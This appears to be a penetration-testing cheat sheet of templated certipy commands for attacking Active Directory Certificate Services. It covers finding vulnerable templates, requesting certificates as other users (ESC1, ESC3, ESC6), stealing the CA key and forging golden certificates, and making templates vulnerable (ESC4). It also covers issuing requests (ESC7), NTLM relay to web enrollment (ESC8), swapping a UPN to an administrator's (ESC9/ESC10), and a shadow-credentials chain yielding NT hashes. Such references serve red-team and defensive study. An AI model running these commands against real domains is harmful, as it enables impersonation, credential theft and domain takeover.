# certipy

#certipy
## certipy - list certificate templates
```
certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> 
```

## certipy - find vulnerable
```
certipy find -u "<user>"@"<domain>" -p "<password>" -dc-ip "<target_ip>" -k -ns "<dc_ip>" -target "<dc_fqdn>" -vulnerable -stdout
```

## certipy - request certificate
```
certipy req -u <user>@<domain> -p <password> -target <ca-fqdn> -template <template> -ca <certificate-authority>
```

## certipy - authenticate with pfx certificate
```
certipy auth -pfx <pfx-file> 
```

## certipy - authenticate through LDAP (Schannel) with pfx certificate
```
certipy auth -pfx <pfx-file> -dc-ip <dc_ip> -ldap-shell
```

## certipy - Golden Certificate - steal CA certificate and private key
```
certipy ca -u <user>@<domain> -p <password> -backup -ca <certificate-authority> -target_ip <ca-ip>
```

## certipy - Golden Certificate - forge certificate
```
certipy forge -ca-pfx <pfx-file> -upn <user>@<domain> -crl ldap://<dc_ip>:389
```

## certipy - request certificate for another user - ESC1 - ESC6
```
certipy req -u <user>@<domain> -p <password> -target <ca-fqdn> -template <template> -ca <certificate-authority> -upn <targeted-user>@<domain>
```

## certipy - request certificate on behalf of with Certificate Request Agent certificate - ESC3
```
certipy req -u <user>@<domain> -p <password> -target <ca-fqdn> -template <template> -ca <certificate-authority> -on-behalf-of <NetBIOS-domain-name>\<targeted-user> -pfx <pfx-file>
```

## certipy - modify template in order to make it vulnerable to ESC1 - ESC4
```
certipy template -u <user>@<domain> -p <password> -template <template> -save-old
```

## certipy - Issue certificate for specific request id - ESC7
```
certipy ca -u <user>@<domain> -p <password> -ca <certificate-authority> -issue-request <csr-id>
```

## certipy - relay authentication to CA Web Enrollment - ESC8
```
certipy relay -ca <ca-fqdn>
```

## certipy - relay domain controller authentication to CA Web Enrollment - ESC8
```
certipy relay -ca <ca-fqdn> -template 'DomainController'
```

## certipy - Modify user upn to another one - ESC9 - ESC10
```
certipy account update -u <user>@<domain> -p <password> -user <targeted-user> -upn <administrator-user>
```

## certipy - Get NT hash - Shadow Credential
Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
```
certipy shadow auto -u <user>@<domain> -p <password> -account <targeted-user>
```

